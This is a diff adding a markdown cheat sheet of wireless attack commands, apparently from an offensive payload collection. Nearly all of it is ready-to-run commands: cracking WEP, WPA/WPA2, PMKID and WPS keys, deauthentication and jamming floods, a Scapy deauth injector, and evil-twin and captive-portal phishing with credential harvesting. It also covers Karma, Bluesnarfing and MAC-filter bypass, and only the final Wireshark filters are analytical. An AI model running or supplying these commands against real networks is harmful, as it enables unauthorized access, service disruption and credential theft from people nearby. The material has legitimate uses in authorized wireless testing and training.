@@ -1,0 +1,302 @@
+# Wireless Attack Payloads
+
+## WiFi Reconnaissance
+
+### Monitor Mode Setup
+airmon-ng check kill                                                   # Kill interfering processes
+airmon-ng start wlan0                                                  # Start monitor mode
+airmon-ng stop wlan0mon                                                # Stop monitor mode
+ifconfig wlan0 down                                                    # Interface down
+iwconfig wlan0 mode monitor                                            # Set monitor mode
+ifconfig wlan0 up                                                      # Interface up
+
+### Network Discovery
+airodump-ng wlan0mon                                                   # Scan all networks
+airodump-ng wlan0mon --band abg                                        # Scan all bands (a/b/g)
+airodump-ng wlan0mon -c 6                                              # Specific channel
+airodump-ng wlan0mon --manufacturer                                    # Show manufacturers
+wash -i wlan0mon                                                       # Scan for WPS
+kismet -c wlan0mon                                                     # Kismet scanner
+iwlist wlan0 scan                                                      # Standard scan
+
+### Targeted Capture
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon         # Capture specific AP
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 --output-format pcap -w capture wlan0mon
+
+## WEP Cracking
+
+### WEP Attack - ARP Replay
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep wlan0mon             # Capture IVs
+aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon   # Fake authentication
+aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon     # ARP replay
+aircrack-ng wep-01.cap                                                 # Crack WEP key
+
+### WEP Attack - Fragmentation
+aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon     # Fragmentation attack
+packetforge-ng -0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w inject.cap
+aireplay-ng -2 -r inject.cap wlan0mon                                  # Inject packets
+
+### WEP Attack - Chop Chop
+aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon     # Chop chop attack
+packetforge-ng -0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 255.255.255.255 -l 255.255.255.255 -y chopchop.xor -w inject.cap
+
+## WPA/WPA2 Cracking
+
+### Capture Handshake
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa wlan0mon             # Capture handshake
+aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon                  # Deauth clients
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon  # Deauth specific client
+
+### Verify Handshake
+aircrack-ng wpa-01.cap                                                 # Check for handshake
+cowpatty -r wpa-01.cap -s ESSID                                        # Verify with cowpatty
+
+### Dictionary Attack
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 wpa-01.cap            # Dictionary attack
+aircrack-ng -w wordlist.txt wpa-01.cap                                 # Auto-detect network
+
+### WPA Cracking with Hashcat
+hcxpcaptool -z hash.hc22000 wpa-01.cap                                 # Convert to hashcat format
+hashcat -m 22000 hash.hc22000 wordlist.txt                             # Hashcat WPA/WPA2
+hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule        # With rules
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d                    # Mask attack (8 digits)
+
+### WPA Cracking with John
+hccap2john wpa-01.cap > hash.john                                      # Convert to john format
+john --wordlist=wordlist.txt hash.john                                 # Crack with john
+
+### Cowpatty
+cowpatty -r wpa-01.cap -f wordlist.txt -s ESSID                        # Dictionary attack
+cowpatty -r wpa-01.cap -d hashfile -s ESSID                            # Rainbow table
+genpmk -f wordlist.txt -d hashfile -s ESSID                            # Generate rainbow table
+
+## WPA3 Attacks
+
+### Dragonblood Attack
+# Use wpa_supplicant with dragonblood patches
+wpa_supplicant -i wlan0 -c wpa3.conf                                   # Connect attempt
+
+### Downgrade Attack
+# Force WPA3 to WPA2 transition mode
+# Configure AP to accept WPA2 clients
+
+## WPS Attacks
+
+### WPS PIN Attack (Reaver)
+wash -i wlan0mon                                                       # Scan for WPS
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv                            # Brute force WPS PIN
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -c 6                       # Specific channel
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 5 -T 0.5 -r 5:3         # Delay & timeout
+
+### WPS Pixie Dust Attack
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K                         # Pixie dust attack
+pixiewps -e PKE -r PKR -s EHASH1 -z EHASH2 -a AUTHKEY -n ENONCE        # Offline pixie
+
+### Bully WPS Attack
+bully wlan0mon -b 00:11:22:33:44:55 -c 6                               # Bully WPS attack
+bully wlan0mon -b 00:11:22:33:44:55 -d -v 3                            # Verbose mode
+
+### OneShot WPS Attack
+python3 oneshot.py -i wlan0mon -b 00:11:22:33:44:55 -K                 # OneShot pixie dust
+
+## Deauthentication Attacks
+
+### Deauth All Clients
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon                   # Continuous deauth
+aireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0mon                 # 100 deauth packets
+
+### Deauth Specific Client
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+### Deauth with mdk3
+mdk3 wlan0mon d -b blacklist.txt                                       # Deauth from blacklist
+mdk3 wlan0mon d -w whitelist.txt                                       # Deauth except whitelist
+mdk3 wlan0mon d -c 6                                                   # Deauth on channel 6
+
+### Deauth with mdk4
+mdk4 wlan0mon d -B 00:11:22:33:44:55                                   # Deauth specific BSSID
+mdk4 wlan0mon d -E SSID                                                # Deauth specific ESSID
+
+## Evil Twin / Rogue AP
+
+### Create Fake AP with hostapd
+# Create hostapd.conf
+cat > hostapd.conf << 'EOF'
+interface=wlan0
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+EOF
+
+hostapd hostapd.conf                                                   # Start fake AP
+
+### Evil Twin with airbase-ng
+airbase-ng -e "FreeWiFi" -c 6 wlan0mon                                 # Create fake AP
+airbase-ng -e "FreeWiFi" -c 6 -a 00:11:22:33:44:55 wlan0mon            # Specific MAC
+
+### Captive Portal Setup
+# After creating fake AP, setup DHCP and web server
+dnsmasq -C dnsmasq.conf                                                # DHCP server
+python3 -m http.server 80                                              # Web server
+
+### Fluxion Automated Evil Twin
+fluxion                                                                # Automated evil twin attack
+
+### Wifiphisher
+wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade                    # Firmware upgrade template
+wifiphisher -aI wlan0 -jI wlan1 -e "TargetSSID"                        # Target specific SSID
+wifiphisher --essid "TargetSSID" --phishing-scenario firmware-upgrade
+
+## PMKID Attack
+
+### Capture PMKID
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1              # Capture PMKID
+hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist=targets.txt --filtermode=2
+
+### Convert and Crack PMKID
+hcxpcaptool -z pmkid.hc22000 pmkid.pcapng                              # Convert
+hashcat -m 22000 pmkid.hc22000 wordlist.txt                            # Crack PMKID
+hashcat -m 22000 pmkid.hc22000 wordlist.txt --force                    # Force mode
+
+## Jamming Attacks
+
+### WiFi Jamming with mdk3
+mdk3 wlan0mon b -c 6                                                   # Beacon flood on channel 6
+mdk3 wlan0mon a -a 00:11:22:33:44:55                                   # Authentication DoS
+mdk3 wlan0mon p -t 00:11:22:33:44:55                                   # Probe request flood
+
+### Spectrum Jamming
+# Hardware-based jamming
+# Use dedicated jamming devices or SDR
+
+## MAC Address Filtering Bypass
+
+### MAC Spoofing
+ifconfig wlan0 down                                                    # Interface down
+macchanger -m 00:11:22:33:44:55 wlan0                                  # Change MAC
+macchanger -r wlan0                                                    # Random MAC
+ifconfig wlan0 up                                                      # Interface up
+
+# Alternative method
+ip link set dev wlan0 down
+ip link set dev wlan0 address 00:11:22:33:44:55
+ip link set dev wlan0 up
+
+## Hidden SSID Discovery
+
+### Discover Hidden Networks
+airodump-ng wlan0mon                                                   # Monitor for probe requests
+aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon                         # Deauth to reveal SSID
+mdk3 wlan0mon p -t 00:11:22:33:44:55 -f ssid_list.txt                  # Probe for SSIDs
+
+## Bluetooth Attacks
+
+### Bluetooth Scanning
+hciconfig hci0 up                                                      # Enable adapter
+hcitool scan                                                           # Scan for devices
+hcitool inq                                                            # Inquiry scan
+btscanner                                                              # Bluetooth scanner
+
+### Bluetooth Information Gathering
+hcitool info 00:11:22:33:44:55                                         # Device info
+sdptool browse 00:11:22:33:44:55                                       # Browse services
+l2ping 00:11:22:33:44:55                                               # L2 ping
+
+### Bluesniff
+bluesniff -i hci0                                                      # Bluetooth sniffer
+
+### Bluesnarfing
+bluesnarfer -b 00:11:22:33:44:55 -C 1                                  # Read phonebook
+
+### Bluebugging
+# Exploit Bluetooth vulnerabilities
+# Use specialized tools like btcrack, bluediving
+
+### BlueJacking
+# Send anonymous messages via Bluetooth
+echo "Test message" > test.txt
+ussp-push 00:11:22:33:44:55@9 test.txt test.txt
+
+## WiFi Pineapple Attacks
+
+### PineAP Suite
+# Enable PineAP
+# Configure SSIDs to impersonate
+# Enable beacon response
+# Enable probe response
+
+### Evil Portal
+# Create captive portal
+# Clone legitimate login pages
+# Harvest credentials
+
+### WiFi Pineapple Modules
+# DNSMassSpoofing
+# SSLsplit
+# URLSnarf
+# DWall (Wall of Sheep)
+
+## Karma Attack
+
+### Karma with airbase-ng
+airbase-ng -c 6 -P -C 60 -e "" wlan0mon                                # Karma attack
+
+### Karma with WiFi Pineapple
+# Enable Karma in PineAP settings
+# Respond to all probe requests
+
+## WEP/WPA Enterprise Attacks
+
+### FreeRADIUS-WPE
+radiusd -X                                                             # Start in debug mode
+# Capture credentials from EAP handshakes
+
+### Hostapd-WPE
+hostapd-wpe hostapd-wpe.conf                                           # Fake enterprise AP
+# Capture MSCHAP challenges
+
+### EAPHammer
+./eaphammer -i wlan0 --auth wpa-psk --essid "TargetSSID" --creds      # Credential harvesting
+./eaphammer -i wlan0 --auth wpa-eap --essid "TargetSSID" --creds      # EAP credential harvesting
+
+## Wireless DoS
+
+### CTS Frame Flood
+mdk3 wlan0mon c -c 6                                                   # CTS flood on channel 6
+
+### Association Flood
+mdk3 wlan0mon a -a 00:11:22:33:44:55                                   # Association flood
+
+### EAPOL Start Flood
+mdk3 wlan0mon e -t 00:11:22:33:44:55                                   # EAPOL flood
+
+## Wireless Packet Injection
+
+### Test Injection
+aireplay-ng -9 wlan0mon                                                # Test injection
+aireplay-ng -9 -e SSID -a 00:11:22:33:44:55 wlan0mon                   # Test on specific AP
+
+### Custom Packet Injection with Scapy
+python3 << 'EOF'
+from scapy.all import *
+packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="aa:bb:cc:dd:ee:ff", addr3="00:11:22:33:44:55")/Dot11Deauth(reason=7)
+sendp(packet, iface="wlan0mon", count=10)
+EOF
+
+## 802.11 Frame Analysis
+
+### Wireshark Filters
+wlan.fc.type == 0                                                      # Management frames
+wlan.fc.type == 1                                                      # Control frames
+wlan.fc.type == 2                                                      # Data frames
+wlan.fc.type_subtype == 0x08                                           # Beacon frames
+wlan.fc.type_subtype == 0x0c                                           # Deauth frames
+eapol                                                                  # EAPOL handshake
+
+### tshark WiFi Capture
+tshark -i wlan0mon -w capture.pcap                                     # Capture
+tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x0c"               # Filter deauth
+tshark -r capture.pcap -Y "eapol"                                      # Filter EAPOL
